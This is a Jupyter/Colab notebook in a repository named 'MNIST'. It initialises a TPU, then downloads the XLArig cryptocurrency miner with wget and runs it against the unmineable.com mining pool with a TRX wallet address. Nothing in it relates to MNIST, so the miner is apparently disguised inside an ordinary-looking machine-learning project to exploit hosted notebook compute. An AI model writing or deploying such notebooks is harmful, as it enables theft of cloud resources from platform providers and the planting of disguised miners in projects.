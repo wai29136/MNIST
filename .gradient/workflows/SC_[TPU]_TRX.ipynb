{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "SC_[TPU]_TRX.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LIWl-PkQrxlP"
      },
      "source": [
        "# **SC [TPU]** *TRX*"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "OzQQy0IH61fN",
        "cellView": "form",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "f37c0ee4-72b4-488b-b0db-d5667acff7d4"
      },
      "source": [
        "#@title Cek TPU [This address identifies the TPU we'll use when configuring TensorFlow.]\n",
        "import os\n",
        "from tensorflow.python.profiler import profiler_client\n",
        "\n",
        "tpu_profile_service_address = os.environ['COLAB_TPU_ADDR'].replace('8470', '8466')\n",
        "print(profiler_client.monitor(tpu_profile_service_address, 100, 2))"
      ],
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "  Timestamp: 06:17:29\n",
            "  TPU type: TPU v2\n",
            "  Utilization of TPU Matrix Units (higher is better): 0.000%\n",
            "\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "IULlsXl-_41c"
      },
      "source": [
        "#@title Experimental Worker\n",
        "import tensorflow as tf\n",
        "try:\n",
        "  resolver = tf.distribute.cluster_resolver.TPUClusterResolver()\n",
        "  tf.config.experimental_connect_to_cluster(resolver)\n",
        "  tf.tpu.experimental.initialize_tpu_system(resolver)\n",
        "  print(\"All devices: \", tf.config.list_logical_devices('TPU'))\n",
        "  strategy = tf.distribute.experimental.TPUStrategy(resolver)\n",
        "except ValueError:\n",
        "  strategy = tf.distribute.get_strategy() "
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "s2ZrbmtjsCME",
        "cellView": "form"
      },
      "source": [
        "#@title **XLArig-v5.2.2**\n",
        "! wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "SCbR6v141v45",
        "cellView": "form"
      },
      "source": [
        "#@title Run\n",
        "! ./xlarig -o rx-us.unmineable.com:13333 -u TRX:TWaMNYJS8hLkrsvjQ8DNJSMuWPjJxUq8zR.XLArigTPU#xuqq-86et -k -t 34"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}